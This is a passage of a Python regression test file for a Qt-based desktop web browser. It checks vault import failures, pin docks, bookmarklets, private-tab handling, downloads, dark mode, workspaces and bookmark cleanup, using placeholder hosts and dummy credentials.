      "try { el = document.querySelector(rows[i]); }" in B.NAV_JS)
check("the image viewer list is read again each call",
      "var shown = (window.__navPics" in B.NAV_JS
      and "if (!pics.length) {\n        pics = window.__navPics" not in B.NAV_JS)

_bad182 = []
for _v182 in (["big"], {}, 5, None):
    try:
        B.chrome_style({"uiSize": _v182, "uiFont": "Sans"})
    except Exception as _e182:
        _bad182.append(repr(_v182))
check("a hand-edited uiSize of the wrong type does not raise",
      not _bad182, str(_bad182))

try:
    _kc182 = B.kitty_colours('author: ""\nbase00: \'\'\nbackground "\nforeground #ffffff')
except Exception as _e182:
    _kc182 = repr(_e182)
check("a line of only quotes is skipped, the rest still read",
      _kc182 == {"text": "#ffffff"}, str(_kc182))
# ===== batch 183: imports that cannot be written, pins and bookmarklets ====
class _Eager183(B.VaultProvider):
    eager = True

    def __init__(self):
        self.ok = True

    def load(self):
        return {}

    def save(self, data):
        return self.ok


_ep183 = _Eager183()
_ev183 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))),
                         provider=_ep183)
_ev183.set_entry("keep183.example", "https", "k", "kpw")
_ep183.ok = False
_bw183 = json.dumps({"items": [
    {"type": 1, "name": "z", "login": {"username": "u", "password": "p",
                                       "uris": [{"uri": "https://z183.example"}]}}]})
_n183 = _ev183.import_bitwarden(_bw183)
check("a Bitwarden import into a vault that cannot write imports nothing",
      _n183 == 0 and len(_ev183.items()) == 1, str((_n183, len(_ev183.items()))))
_csv183 = ("url,username,password\nhttps://y183.example,a,b\n"
           "https://keep183.example,k,newpw\n")
_n183 = _ev183.import_rows(_csv183)
check("a CSV import into a vault that cannot write imports nothing and "
      "restores an updated login",
      _n183 == 0 and len(_ev183.items()) == 1
      and _ev183.items()[0]["password"] == "kpw",
      str((_n183, [i.get("password") for i in _ev183.items()])))
_ep183.ok = True
_exp183 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "v.browservault"
_ev183.export_encrypted(_exp183, "pass183")
_ep183.ok = False
_n183 = _ev183.import_encrypted(_exp183, "pass183", replace=True)
check("an encrypted replace-import that cannot write reports failure and "
      "keeps the old list",
      _n183 == -1 and [i["host"] for i in _ev183.items()] == ["keep183.example"],
      str((_n183, [i.get("host") for i in _ev183.items()])))


class _Lazy183:
    eager = False
    locked = False

    def __init__(self):
        self.fail = False
        self.row = {"id": "r1", "type": "login", "host": "l183.example",
                    "username": "u", "password": "old183", "scheme": "https"}

    def load(self):
        return {"items": [dict(self.row)]}

    def put(self, item):
        return None if self.fail else {"id": "r1"}

    def delete(self, item_id):
        return True


_lp183 = _Lazy183()
_lv183 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))),
                         provider=_lp183)
_lp183.fail = True
_r183 = _lv183.set_entry("l183.example", "https", "u", "new183")
_row183 = _lv183.items()[0]
check("a refused password change leaves the existing login as it was",
      _r183 is None and _row183.get("password") == "old183"
      and not _row183.get("history"),
      str((_r183, _row183.get("password"), _row183.get("history"))))

import inspect as _insp183
check("overview cards double an ampersand in a title",
      "_amp(" in _insp183.getsource(B.TabOverview.refresh))
check("pin buttons and the pin overflow menu escape an ampersand",
      "_amp(" in _insp183.getsource(B.PinButton.set_pin)
      and "_amp(" in _insp183.getsource(B.TaskBar._overflow_menu))

# the dock only exists under the dock look: without one, the fitting
# code is checked by reading it
if getattr(br, "dock", None) is not None:
    _d183 = br.dock
    _was183 = (list(_d183._pins), _d183.isVisible())
    try:
        _pins183 = [{"url": "https://p%d.example/" % i, "name": "p%d" % i,
                     "icon": ""} for i in range(40)]
        _d183.set_pins(_pins183)
        _par183 = _d183.parentWidget()
        _cells183 = _d183.cells()
        _more183 = _d183.more_cell()
        _room183 = _d183.island().right()
        check("a dock with more pins than fit draws only those that fit and "
              "gives the rest a menu cell",
              _more183 is not None and len(_cells183) < 40
              and all(c[0].right() <= _room183 for c in _cells183)
              and _more183.right() <= _room183 + 1,
              str((len(_cells183), _more183)))
        _d183.set_pins(_pins183[:2])
        check("...and a short row has no menu cell",
              _d183.more_cell() is None and len(_d183.cells()) == 2)
    finally:
        _d183.set_pins(_was183[0])
else:
    check("a dock with more pins than fit gives the rest a menu cell",
          "more_cell" in _insp183.getsource(B.Dock))

_cfgpins183 = br.config.get("startPage")
_seen183 = []
_orig183 = None
_w183 = None
try:
    _w183 = br.new_window() if hasattr(br, "new_window") else None
except Exception:
    _w183 = None
if _w183 is not None:
    try:
        _pk183 = list(br.pins())
        br.add_pin("https://pinwin183.example/", "pw183")
        _names183 = [p["name"] for p in _w183.pins()]
        _bar183 = _w183.taskbar or _w183.dock
        _have183 = [p["name"] for p in (_bar183._pins if _bar183 else [])]
        check("a pin made in one window reaches the other window's furniture",
              _bar183 is None or "pw183" in _have183, str(_have183))
    finally:
        br.remove_pin("https://pinwin183.example/")
        _w183._closing_anyway = True
        _w183.close()
else:
    check("refresh_pins loops over every window",
          "_all_windows" in _insp183.getsource(B.Browser.refresh_pins))

_calls183 = []
br.run_bookmarklet = lambda entry, view=None: _calls183.append(entry) or True
try:
    br.open_bookmark({"id": 9183, "type": "link", "url": "", "js": "1+1"})
    check("a plain click on a bookmarklet runs it", len(_calls183) == 1,
          str(_calls183))
    br.open_bookmark({"id": 9184, "type": "link", "url": "", "js": "1+1"},
                     new_tab=True)
    check("...but opening it 'in a new tab' (or open-all) does not",
          len(_calls183) == 1, str(_calls183))
finally:
    br.__dict__.pop("run_bookmarklet", None)
# ---- fixes 184: selection, closed tabs, lazy tabs, pins, groups, wrappers, panic ----
import inspect as _insp184
_src_sel184 = _insp184.getsource(B.Browser.select_tab_range)
check("a shift-click range holds only this browser's visible tabs",
      "active_session" in _src_sel184 and "isTabVisible" in _src_sel184)
check("the selection drops tabs of another virtual browser",
      "active_session" in _insp184.getsource(B.Browser.selected_tabs))


class _BlankView184:
    private = False

    def url(self):
        return B.START_PAGE


_n184 = len(br._closed_tabs)
br._remember_closed(_BlankView184(), 0)
check("a blank start-page tab is not remembered as closed",
      len(br._closed_tabs) == _n184, str(len(br._closed_tabs) - _n184))

for _name184 in ("tab_urls", "bookmark_all_tabs", "close_site_tabs",
                 "group_site_tabs"):
    check("%s reads the address of a tab not woken up" % _name184,
          "_tab_url" in _insp184.getsource(getattr(B.Browser, _name184)))
check("pinning looks only at this browser's pinned tabs",
      "session=getattr(view" in _insp184.getsource(B.Browser.pin_tab))

_pv184 = br.new_tab(url=srv.url("/twhome"), private=True)
try:
    H.wait_for(lambda: "/twhome" in _pv184.url().toString(), 8000)
    _sel184 = br._sel_views
    br._sel_views = [_pv184]
    _got184 = br.group_selection("g184")
    check("a private tab is not grouped by the selection",
          _got184 is None and getattr(_pv184, "group", None) is None,
          str(getattr(_pv184, "group", None)))
    br._sel_views = _sel184
finally:
    _close_if_open(_pv184)

_u184 = "https://www.google.com/search?q=https://example.com/x"
check("an ordinary link on a wrapper host is not rewritten",
      br.unwrap_redirect(_u184) == _u184, br.unwrap_redirect(_u184))
check("a real wrapper link still unwraps",
      br.unwrap_redirect("https://www.google.com/url?q=https://example.com/x")
      == "https://example.com/x")

_src_panic184 = _insp184.getsource(B.Browser.panic)
check("panic reaches the other windows and popped-out tabs",
      "self.windows()" in _src_panic184 and "_popouts" in _src_panic184)
# ---- 185: J25-J32 ----
import inspect as _inspect185

# J25: the next page loads into the tab the tool ran on, not the one in front
_a185 = br.new_tab(srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _a185.url().toString(), 8000)
_b185 = br.new_tab(srv.url("/drafts"))
H.wait_for(lambda: "/drafts" in _b185.url().toString(), 8000)
_saved185 = _a185.load
_got185 = []
try:
    br.tabs.setCurrentWidget(_a185)
    _a185.load = lambda u: _got185.append(("a", u.toString()))
    _b185.load = lambda u: _got185.append(("b", u.toString()))
    _held185 = []
    br.__dict__["page_tool"] = lambda name, view=None, then=None, **k: (
        _held185.append((view, then)) or True)
    br.go_page()
    br.tabs.setCurrentWidget(_b185)
    _held185[0][1]("http://example.org/page2")
    check("185 J25 next page goes to the tab it was asked on",
          _got185 == [("a", "http://example.org/page2")], str(_got185))
finally:
    br.__dict__.pop("page_tool", None)
    _a185.__dict__.pop("load", None)
    _b185.__dict__.pop("load", None)
_src185 = _inspect185.getsource(B.Browser.media_speed)
check("185 J25 media speed keeps the tab it ran on",
      "self._remember_media(view, " in _src185, _src185[:80])
for _v185 in (_a185, _b185):
    _close_if_open(_v185)

# J26: a chord letter or repeat goes through the per-site key rules
check("185 J26 run_action uses the guarded door",
      "_palette_run" in _inspect185.getsource(B.Browser.run_action))
_ran185 = []
_old_allowed185 = br.key_allowed_here
try:
    br.__dict__["key_allowed_here"] = lambda action_id: False
    _entry185 = {"id": "x185", "run": lambda: _ran185.append(1), "pane": False}
    br._palette_run(_entry185)
    check("185 J26 an action switched off for the site does not run",
          _ran185 == [])
finally:
    br.__dict__.pop("key_allowed_here", None)

# J27: a private tab's place stays in memory, off config.json
_priv185 = br.new_tab(srv.url("/twhome"), private=True)
H.wait_for(lambda: "/twhome" in _priv185.url().toString(), 8000)
_host185 = _priv185.url().host()
_places185 = dict(br.config.get("fakePlaces") or {})
_old_dlg185 = B.QInputDialog.getText
try:
    br.tabs.setCurrentWidget(_priv185)
    B.QInputDialog.getText = staticmethod(lambda *a, **k: ("12.5, 34.5", True))
    br.ask_fake_place(_host185)
    check("185 J27 private place is in memory",
          B._PRIVATE_PLACES.get(_host185) == {"lat": 12.5, "lon": 34.5})
    check("185 J27 private place not in config",
          (br.config.get("fakePlaces") or {}) == _places185)
    _menu185 = br.guard_menu()
    _texts185 = [a.text() for a in _menu185.actions()]
    check("185 J27 private guard menu has no per-host rule submenus",
          not any(a.menu() is not None and "%s" not in a.text()
                  and _host185 in a.text() for a in _menu185.actions()),
          str(_texts185))
finally:
    B.QInputDialog.getText = _old_dlg185
    B._PRIVATE_PLACES.pop(_host185, None)
    br.refresh_guard_scripts()
    _close_if_open(_priv185)

# J28: delete_group stops a recording and updates counts
_src185 = _inspect185.getsource(B.Browser.delete_group)
check("185 J28 delete_group stops recording and remembers tabs",
      all(s in _src185 for s in ("stop_recording", "_remember_closed",
                                 "_update_private_marks",
                                 "_update_tab_count")))

# J29: leaving zen follows the strip rules
_src185 = _inspect185.getsource(B.Browser.zen_mode)
check("185 J29 zen restores the strip through the strip rule",
      "_apply_strip_visibility" in _src185)
_old_app185 = br._app_url
try:
    br._app_url = "http://example.org/"
    br.zen_mode(True)
    br.zen_mode(False)
    check("185 J29 no strip back in an app window",
          not br.tabs.tabBar().isVisible())
finally:
    br._app_url = _old_app185
    br.zen_mode(False)
    br._apply_strip_visibility()

# J30: switched on from the root window's point of view, the root is hooked
_src185 = _inspect185.getsource(B.Browser.watch_clipboard)
check("185 J30 the root window is the one hooked",
      "root._clipboard_changed" in _src185 and "_root_window()" in _src185)

# J31: GUI editors are started so that they wait
check("185 J31 kate waits",
      br._editor_command("/usr/bin/kate") == ["/usr/bin/kate", "--block"])
check("185 J31 gedit waits",
      br._editor_command("/usr/bin/gedit") == ["/usr/bin/gedit", "--wait"])
check("185 J31 an unknown editor is unchanged",
      br._editor_command("/usr/bin/foo185") == ["/usr/bin/foo185"])

# J32: no note, no traceback and no "saved"
_flashes185 = []


class _Desk185:
    def daily_note(self):
        return None


_old_desk185 = br.desk
try:
    br.__dict__["desk"] = lambda: _Desk185()
    br.__dict__["flash"] = lambda msg, *a, **k: _flashes185.append(msg)
    br.__dict__["desk_tool"] = lambda name, view=None, then=None, **k: then(
        json.dumps({"t": 75, "title": "v"}))
    _v185 = br.current()
    br.video_time_note(_v185)
    check("185 J32 unwritable notes folder says so",
          _flashes185 == [br._ui_str("readSaveFailed")], str(_flashes185))
finally:
    for _n185 in ("desk", "flash", "desk_tool"):
        br.__dict__.pop(_n185, None)
# ---- tests for the 186 group ----
import inspect as _insp186

# J33: a failed reply is not "clean", and the counters belong to a run
class _Fail186:
    def readAll(self):
        return b""

    def error(self):
        return B.QNetworkReply.NetworkError.HostNotFoundError

    def deleteLater(self):
        pass


_flashes186 = []
_real_flash186 = br.flash
br.flash = lambda msg, *a, **k: _flashes186.append(msg)
try:
    _run186 = {"left": 1, "found": [], "failed": 0}
    br._breach_answer(_Fail186(), "AAAAA", [], None, _run186)
    _other186 = {"left": 2, "found": [], "failed": 0}
    br._breach_answer(_Fail186(), "AAAAA", [], None, _other186)
finally:
    br.__dict__.pop("flash", None)
check("a failed breach request is not reported as clean",
      _flashes186 == [br._ui_str("breachFailed")]
      and br._ui_str("breachClean") not in _flashes186, str(_flashes186))
check("a breach run keeps its own counters",
      _run186["left"] == 0 and _other186["left"] == 1)

# J34: no reveal in a GUI-thread loop for a slow provider
check("the reuse check goes through a worker for a slow provider",
      "vault_job" in _insp186.getsource(br.check_password_reuse))

# J35: rows that are not dicts
_mom186 = br.config.get("videoMoments")
_clp186 = br.config.get("clipMarks")
try:
    br.config["videoMoments"] = ["x", None, {"url": "https://a.example/v",
                                             "t": 1}]
    br.config["clipMarks"] = [None, "y", {"url": "https://a.example/v"}]
    _m186 = br.moments("https://a.example/v")
    _c186 = br.clips()
    check("moments and clips skip rows that are not dicts",
          len(_m186) == 1 and len(_c186) == 1, "%s %s" % (_m186, _c186))
finally:
    if _mom186 is None:
        br.config.pop("videoMoments", None)
    else:
        br.config["videoMoments"] = _mom186
    if _clp186 is None:
        br.config.pop("clipMarks", None)
    else:
        br.config["clipMarks"] = _clp186

# J36: carrying on a waiting download takes it out of the queue
class _Req186:
    def isPaused(self):
        return True

    def resume(self):
        self.resumed = True


_req186 = _Req186()
_ent186 = {"id": 987186, "queued": True, "state": "progressing"}
_de186 = br.download_entry
_active186 = br.dl_active
_queue186 = list(getattr(br, "_dl_queue", None) or [])
br.download_entry = lambda i: _ent186 if i == 987186 else _de186(i)
br.dl_active[987186] = _req186
br._dl_queue = list(_queue186) + [987186]
try:
    _ok186 = br.resume_download(987186)
    check("resuming a waiting download takes it out of the queue",
          _ok186 and "queued" not in _ent186
          and 987186 not in br._dl_queue
          and getattr(_req186, "resumed", False))
finally:
    br.__dict__.pop("download_entry", None)
    br.dl_active.pop(987186, None)
    br._dl_queue[:] = _queue186

# J37: the switch state is the tab's
_va186 = br.new_tab()
H.load(_va186, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _va186.url().toString(), 8000)
_va186._dev_on = {"devRuler": True}
check("a developer switch is read from the tab in front",
      br.dev_on("devRuler", view=_va186) is True
      and br.dev_on("devRuler", view=br.tabs.widget(0)) is False)
_va186._dev_on = {}
_close_if_open(_va186)

# J38: a TIFF is seen as carrying metadata, and a failed strip refuses
_tf186 = _Path(_tempfile.mkdtemp()) / "a.tif"
_tf186.write_bytes(b"II*\x00\x08\x00\x00\x00" + b"\x00" * 64)
check("a TIFF counts as carrying metadata", br.image_has_metadata(_tf186))
_src186 = _insp186.getsource(br.put_file_in_upload)
check("an upload that could not be cleaned is refused",
      "return False" in _src186.split("if not cleaned")[1].split("try:")[0])
_tf186.unlink()

# J39: statements fall back to a script run
_src186 = _insp186.getsource(br.run_snippet)
check("a snippet that is not an expression is run as a script",
      "eval" in _src186 and "def first" in _src186)

# J40: the tab left is the view, not its index
_vx186 = br.new_tab()
_vy186 = br.new_tab()
H.wait_for(lambda: True, 100)
br.tabs.setCurrentWidget(_vx186)
H.spin(50)
_vx186._last_seen = 1.0
_vy186._last_seen = 2.0
_pos186 = br.tabs.indexOf(_vx186)
br._seen_view = _vx186
br._tab_looked_at(br.tabs.indexOf(_vy186))
check("leaving a tab stamps that tab",
      _vx186._last_seen > 100 and _vy186._last_seen > 100)
_close_if_open(_vx186)
_close_if_open(_vy186)

# J41: the chosen scheme survives a navigation
_vz186 = br.new_tab()
H.load(_vz186, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _vz186.url().toString(), 8000)
br.emulate_media("dark", view=_vz186)
br._apply_page_force_dark(_vz186)
_fd186 = _vz186.page().settings().testAttribute(
    B.QWebEngineSettings.WebAttribute.ForceDarkMode)
br.emulate_media("off", view=_vz186)
check("emulated dark survives the next navigation", _fd186 is True
      and getattr(_vz186, "_media_scheme", 1) is None)
_close_if_open(_vz186)
# ---- findings 42-50 of the nineteenth pass ----
import inspect as _insp187
import types as _types187

# J42: with history off, a picture or words taken a moment later are refused
_cfg_h187 = br.config.get("history", True)
_v187 = br.new_tab(); H.load(_v187, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _v187.url().toString(), 8000)
_u187 = br._tab_url(_v187)
try:
    br.config["history"] = True
    _on187 = br._visit_still_on(_v187, _u187)
    br.config["history"] = False
    _off187 = br._visit_still_on(_v187, _u187)
finally:
    br.config["history"] = _cfg_h187
check("history off: a page's picture and words are not kept either",
      _on187 is True and _off187 is False
      and 'self.config.get("history", True)'
      in _insp187.getsource(br._title_changed), str((_on187, _off187)))

# J43 / J44: the engine keeps no optional braces; a failed fetch says so
_eng187 = []


class _Reply187:
    def __init__(self, body, bad=False):
        self.body, self.bad = body, bad

    def readAll(self):
        return self.body

    def error(self):
        return (B.QNetworkReply.NetworkError.ContentNotFoundError
                if self.bad else B.QNetworkReply.NetworkError.NoError)

    def deleteLater(self):
        pass


_os187 = json.loads(json.dumps(br.config.get("openSearch") or {}))
_flashes187 = []
br.add_engine = lambda name, pattern, **k: _eng187.append(pattern)
br.flash = lambda text, *a, **k: _flashes187.append(text)
try:
    br._opensearch_answer(_Reply187(
        b'<OpenSearchDescription><ShortName>S187</ShortName>'
        b'<Url type="text/html" template="https://s187.example/s?q='
        b'{searchTerms}&amp;hl={language}&amp;n={count?}"/>'
        b'</OpenSearchDescription>'), "s187.example", "S187")
    br._opensearch_answer(_Reply187(b"", bad=True), "s187.example", "S187")
    br._opensearch_answer(_Reply187(b"<html></html>"), "s187.example",
                          "S187")
finally:
    br.__dict__.pop("add_engine", None)
    br.__dict__.pop("flash", None)
    br.config["openSearch"] = _os187
check("an added OpenSearch engine loses the optional braces",
      len(_eng187) == 1 and "{" not in _eng187[0].replace("{", "", 0)
      and "%s" in _eng187[0] and "{language}" not in _eng187[0]
      and "{count" not in _eng187[0], str(_eng187))
check("a failed OpenSearch fetch does not talk about a certificate",
      len(_flashes187) >= 3
      and _flashes187[-1] == _flashes187[-2]
      and _flashes187[-1] != br._ui_str("barCertNone"),
      str(_flashes187))

# J45: a mode's theme is applied, not only written
_modes187 = br.config.get("modes")
_now187 = br.config.get("modeNow")
_theme187 = br.config.get("theme")
_seen187 = []
br.config["modes"] = {"m187": {"theme": "latte"}}
br.apply_theme = lambda name, *a, **k: _seen187.append(name)
try:
    br.open_mode("m187")
finally:
    br.__dict__.pop("apply_theme", None)
    br.config["modes"] = _modes187
    br.config["modeNow"] = _now187
    br.config["theme"] = _theme187
check("opening a mode paints its theme", _seen187 == ["latte"],
      str(_seen187))

# J46: the recording mark stays through a relabel
_had_rec187 = "_recording" in br.__dict__
_rec187 = br.__dict__.get("_recording")
_had_mk187 = "_recording_mark" in br.__dict__
_mk187 = br.__dict__.get("_recording_mark")
try:
    br._recording = _types187.SimpleNamespace(view=_v187)
    br._recording_mark = True
    _lab187 = br._tab_label(_v187)
    _ov187 = next((v for _i, v in br._real_tabs() if v is not _v187),
                  None)
    _other187 = br._tab_label(_ov187) if _ov187 is not None else ""
finally:
    if _had_rec187:
        br._recording = _rec187
    else:
        br.__dict__.pop("_recording", None)
    if _had_mk187:
        br._recording_mark = _mk187
    else:
        br.__dict__.pop("_recording_mark", None)
check("the recorded tab's label keeps its mark",
      _lab187.startswith("● ")
      and not _other187.startswith("● "), str((_lab187, _other187)))

# J47: pinned, locked and game tabs are not "unused"
_cur187 = br.current()
# another live tab in front, so _v187 is a tab in the background (v15,
# used here first, was closed long before this point)
_front187 = next((v for _i, v in br._real_tabs() if v is not _v187), None)
if _front187 is None:
    _front187 = br.new_tab()
br.tabs.setCurrentWidget(_front187)
H.spin(100)
_v187._last_seen = 1
_res187 = {}
try:
    for _how in ("plain", "pinned", "locked", "game"):
        _v187.pinned = _how == "pinned"
        _v187.locked = _how == "locked"
        _v187._game = _how == "game"
        _res187[_how] = any(r["view"] is _v187
                            for r in br.unused_tabs(days=1))
finally:
    _v187.pinned = _v187.locked = _v187._game = False
check("unused tabs skip pinned, locked and game tabs",
      _res187 == {"plain": True, "pinned": False, "locked": False,
                  "game": False}, str(_res187))

# J48: captions are refused for a page the tab has left
_flashes187.clear()
_r48 = br.put_captions_on_video(
    "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\nhi\n", view=_v187,
    expect={"url": "http://other187.invalid/", "src": ""})
check("captions are not put on another page's video", _r48 is False,
      str(_r48))

# J49 / J50: source checks (the page JS and the crop need a real image)
_src49 = _insp187.getsource(br._tallest_scroller)
check("the scrolling-area selector is a unique path, not tag.class",
      "nth-child" in _src49 and "CSS.escape" in _src49
      and "split(/" not in _src49)
check("the OCR crop follows the page zoom",
      "self._zoom_of(view)" in _insp187.getsource(br.ocr_selection))

_close_if_open(_v187)
# ---- fixes 188: prefetch, keep-awake, freeze, rows, workspaces, history tree, epub, import ----
import inspect as _insp188
_src_pre188 = _insp188.getsource(B.Browser.preload_link)
check("a hover prefetch goes through the engine, not the own manager",
      "_nam" not in _src_pre188 and "prefetch" in _src_pre188)
check("the most visited hosts are never written into a page",
      "createElement" not in _insp188.getsource(B.Browser.preconnect_frequent))

_pv188 = br.new_tab(url=None, private=True)
_kw188 = list(br.config.get("keepAwake") or [])
try:
    H.spin(300)
    br.tabs.setCurrentWidget(_pv188)
    check("keep-awake from a private tab writes nothing",
          br.keep_tab_awake() is False
          and list(br.config.get("keepAwake") or []) == _kw188)
finally:
    br.config["keepAwake"] = _kw188
    _close_if_open(_pv188)

class _FakePage188:
    def __init__(self):
        self.state = None

    def recentlyAudible(self):
        return False

    def setLifecycleState(self, s):
        self.state = s


class _FakeView188:
    private = False
    pinned = False
    _game = False

    def __init__(self):
        self._p = _FakePage188()

    def page(self):
        return self._p

    def url(self):
        return B.QUrl("https://example.invalid/")


_fv188 = _FakeView188()
_sp188 = br.config.get("sleepPinned")
try:
    _fv188._game = True
    check("a game tab is not frozen", br.freeze_tab(_fv188, True) is False)
    _fv188._game = False
    _fv188.pinned = True
    br.config["sleepPinned"] = False
    check("a pinned tab is not frozen", br.freeze_tab(_fv188, True) is False)
    _fv188.pinned = False
    br._media_live = list(getattr(br, "_media_live", None) or []) + [
        {"view": _fv188}]
    check("a tab in a call is not frozen",
          br._capturing(_fv188) is False
          or br.freeze_tab(_fv188, True) is False)
finally:
    br._media_live = [r for r in (getattr(br, "_media_live", None) or [])
                      if r.get("view") is not _fv188]
    if _sp188 is None:
        br.config.pop("sleepPinned", None)
    else:
        br.config["sleepPinned"] = _sp188

_rows188 = br.config.get("tabRows")
_w188 = br.width()
try:
    br.tab_rows(2)
    _sheet188 = br.tabs.tabBar().styleSheet()
    br.resize(_w188 + 200, br.height())
    H.spin(200)
    check("the row width follows the window",
          br.tabs.tabBar().styleSheet() != _sheet188
          or br.width() == _w188, _sheet188)
finally:
    br.resize(_w188, br.height())
    br.tab_rows(int(_rows188 or 1))
    if not _rows188:
        br.config.pop("tabRows", None)
check("the row width is worked out from the tab count",
      "tabs.count()" in _insp188.getsource(B.Browser._fit_tab_rows))

_ws188 = dict(br.workspaces())
_now188 = br.workspace_now()
try:
    br.config["workspaces"] = dict(_ws188, empty188=[{"u": "file:///x"}])
    _n188 = br.tabs.count()
    check("a set with no pages in it closes nothing",
          br.open_workspace("empty188") == []
          and br.tabs.count() == _n188)
finally:
    br.config["workspaces"] = _ws188
    br.config["workspaceNow"] = _now188
_src_ws188 = _insp188.getsource(B.Browser.open_workspace)
check("a workspace switch keeps locked, pinned and private tabs",
      all(w in _src_ws188 for w in ("locked", "pinned", "private")))

_hist188 = br.history
try:
    br.history = [
        {"url": "http://a188/", "t": 1, "f": ""},
        {"url": "http://b188/", "t": 2, "f": "http://a188/"},
        {"url": "http://a188/", "t": 3, "f": "http://b188/"},
    ]
    br.visible_history = lambda: br.history
    tree188 = br.history_tree()

    def _depth188(n):
        return 1 + max([_depth188(k) for k in n["kids"]] or [0])
    check("a page visited twice does not make the tree loop",
          max(_depth188(n) for n in tree188) <= 3, str(tree188))
    check("the trail follows the latest visit",
          [r["url"] for r in br.history_trail("http://a188/")][-1]
          == "http://a188/")
finally:
    br.__dict__.pop("visible_history", None)
    br.history = _hist188

_src_ep188 = _insp188.getsource(B.Browser.open_epub)
check("an epub allows no request and strips frames and links",
      "default-src 'none'" in _src_ep188 and "iframe" in _src_ep188
      and "base-uri" in _src_ep188 and "2 * 1024 * 1024" in _src_ep188)
check("a history import honours never-record and cleans trimmed rows",
      "never_record" in _insp188.getsource(B.Browser.import_history_from)
      and "_history_dropped" in _insp188.getsource(
          B.Browser.import_history_from))
# ---- J59-J65 ----
import inspect as _insp_x189

# J59: the Images submenu is filled in the live menu
_menu_x189 = B.QMenu(br)
_got_x189 = br.image_gallery(view=br.current(), menu=_menu_x189)
check("J59 image_gallery fills the menu it is given",
      _got_x189 is _menu_x189)
check("J59 nav menu passes the live submenu",
      "image_gallery(view=view, menu=m)" in _insp_x189.getsource(br.nav_menu))
# kept: the page answers later and fills it then (deleted here, the
# answer found no menu)

# J60: mono audio is read per site
_sites_x189 = br.config.get("a11ySites")
_tab_x189 = br.new_tab(url=B.QUrl(srv.url("/twhome")))
_v_x189 = br.current()
H.wait_for(lambda: "/twhome" in _v_x189.url().toString(), 8000)
try:
    _h_x189 = br._host_of(_v_x189.url())
    br.config["a11ySites"] = {_h_x189: {"monoAudio": True}}
    check("J60 per-site mono makes the shaping wanted for that tab",
          br.audio_shape_wanted(_v_x189) is True)
    check("...and not for no tab", br.audio_shape_wanted() is False
          or br.a11y_config().get("monoAudio"))
finally:
    if _sites_x189 is None:
        br.config.pop("a11ySites", None)
    else:
        br.config["a11ySites"] = _sites_x189
    _close_if_open(_v_x189)

# J61: a subdomain of a left-alone site can be un-excluded
_rules_x189 = br.config.get("darkSiteRules")
_calls_x189 = []
try:
    br.config["darkSiteRules"] = ["example.com"]
    check("J61 subdomain reads as left alone",
          br.site_left_alone("sub.example.com") is True)
    _out_x189 = br.toggle_site_dark("sub.example.com")
    check("J61 toggling it takes the parent rule out",
          _out_x189 is False
          and br.site_left_alone("sub.example.com") is False,
          br.config.get("darkSiteRules"))
    _native_x189 = sorted(B.NATIVE_DARK_SITES)[0]
    check("J61 a built-in site stays left alone, and says so",
          br.toggle_site_dark(_native_x189) is True
          and br.site_left_alone(_native_x189) is True)
finally:
    if _rules_x189 is None:
        br.config.pop("darkSiteRules", None)
    else:
        br.config["darkSiteRules"] = _rules_x189
    br.set_dark_site_rules(_rules_x189 or [])

# J62: a tab that has moved on is not reloaded
_tab_x189 = br.new_tab(url=B.QUrl(srv.url("/twhome")))
_w_x189 = br.current()
H.wait_for(lambda: "/twhome" in _w_x189.url().toString(), 8000)
try:
    check("J62 still wanted at the failed address",
          br._retry_still_wanted(_w_x189, _w_x189.url().toString()) is True)
    check("J62 not wanted once the tab shows something else",
          br._retry_still_wanted(_w_x189, srv.url("/elsewhere")) is False)
    br.retry_when_online(view=_w_x189, url=srv.url("/twhome"))
    br.retry_when_online(view=br.current(), url=srv.url("/drafts"))
    check("J62 one retry entry per tab",
          _w_x189 in br._retry_rows)
    br._retry_cancel(_w_x189)
    check("J62 a load that worked cancels the retry",
          _w_x189 not in br._retry_rows)
finally:
    br._retry_rows.clear()
    if getattr(br, "_retry_timer", None) is not None:
        br._retry_timer.stop()
    _close_if_open(_w_x189)

# J63: the translator process is deleted, the QR picture is found by string
_src_x189 = _insp_x189.getsource(br.run_translator)
check("J63 run_translator deletes its process",
      "proc.finished.connect(proc.deleteLater)" in _src_x189)
check("J63 read_qr_image no longer builds a selector from the address",
      "querySelector(" not in _insp_x189.getsource(br.read_qr_image)
      .split("document.querySelectorAll")[0])

# J64: reset and undo re-apply the keys that need a call of their own
_seen_x189 = []
_names_x189 = ("apply_site_fonts", "set_mono_favicons",
               "set_page_theme_colour", "set_reveal_in_fullscreen",
               "refresh_own_pages")
_saved_x189 = {k: br.config.get(k, "__absent__")
               for k in ("monoFavicons", "pageThemeColour",
                         "revealInFullscreen", "siteFonts", "appearanceBackup")}
try:
    for _n_x189 in _names_x189:
        setattr(br, _n_x189, lambda *a, _n=_n_x189, **k: _seen_x189.append(_n))
    br.config["siteFonts"] = {"sans": "Sans"}
    br.reset_appearance()
    check("J64 reset re-applies fonts, favicons, bar colour, fullscreen, pages",
          set(_seen_x189) == set(_names_x189), _seen_x189)
    del _seen_x189[:]
    br.undo_reset_appearance()
    check("J64 undo re-applies them too",
          set(_seen_x189) == set(_names_x189), _seen_x189)
finally:
    for _n_x189 in _names_x189:
        br.__dict__.pop(_n_x189, None)
    for _k_x189, _v_x189b in _saved_x189.items():
        if _v_x189b == "__absent__":
            br.config.pop(_k_x189, None)
        else:
            br.config[_k_x189] = _v_x189b

# J65: unused bookmarks inside a locked folder are not offered
_bms_x189 = br.bookmarks
_ask_x189 = B.QMessageBox.question
try:
    br.bookmarks = [
        {"id": "f189", "type": "folder", "title": "F", "locked": True,
         "parent": ""},
        {"id": "a189", "type": "link", "title": "A", "url": "https://a.test/",
         "parent": "f189", "t": 1, "used": 1},
        {"id": "b189", "type": "link", "title": "B", "url": "https://b.test/",
         "parent": "", "t": 1, "used": 1}]
    B.QMessageBox.question = staticmethod(
        lambda *a, **k: B.QMessageBox.StandardButton.Yes)
    br.show_unused_bookmarks()
    _ids_x189 = sorted(e["id"] for e in br.bookmarks)
    check("J65 the locked folder keeps its link, the loose one goes",
          _ids_x189 == ["a189", "f189"], _ids_x189)
finally:
    B.QMessageBox.question = _ask_x189
